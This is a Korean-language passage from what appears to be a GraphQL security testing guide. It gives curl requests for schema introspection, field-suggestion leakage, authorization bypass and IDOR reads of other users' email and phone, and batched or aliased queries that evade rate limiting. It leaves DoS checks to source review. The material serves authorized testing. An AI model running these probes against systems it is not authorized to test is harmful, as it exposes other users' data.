### Phase 2: 동적 테스트 (검증)


**Introspection 테스트:**
```
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# 또는 전체 Introspection 쿼리
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind } } } } }"}'
```

**Field Suggestion 테스트:**
```
# 존재하지 않는 필드로 쿼리 → 에러 메시지에서 유사 필드 제안 확인
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usrs { id } }"}'
# "Did you mean 'users'?" 같은 메시지가 반환되면 정보 노출
```

**인가 우회 테스트:**
```
# 일반 사용자 토큰으로 관리자 쿼리/뮤테이션 시도
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ adminUsers { id email role } }"}'

# 다른 사용자의 데이터 접근 시도 (IDOR)
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{ user(id: \"OTHER_USER_ID\") { email phone } }"}'
```

**Batch 쿼리 테스트:**
```
# 배열 쿼리로 Rate Limiting 우회
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:\"1\") { name } }"},{"query":"{ user(id:\"2\") { name } }"},{"query":"{ user(id:\"3\") { name } }"}]'

# Alias 기반 batch
curl -X POST "https://target.com/graphql" \
  -d '{"query":"{ a1:user(id:\"1\"){name} a2:user(id:\"2\"){name} a3:user(id:\"3\"){name} }"}'
```

**쿼리 복잡도 제한 확인 (소스코드 분석으로만 판단):**
쿼리 복잡도 DoS는 동적 테스트로 검증하지 않는다. 실제 DoS를 유발하면 서비스에 영향을 줄 수 있으므로, 소스코드에서 `depthLimit`, `queryComplexity` 등 제한 설정이 있는지만 확인하고 누락 시 후보로 보고한다.

**검증 기준:**
- **확인됨**: 동적 테스트로 Introspection 스키마 노출, 인가 우회, Field Suggestion 정보 노출이 확인됨
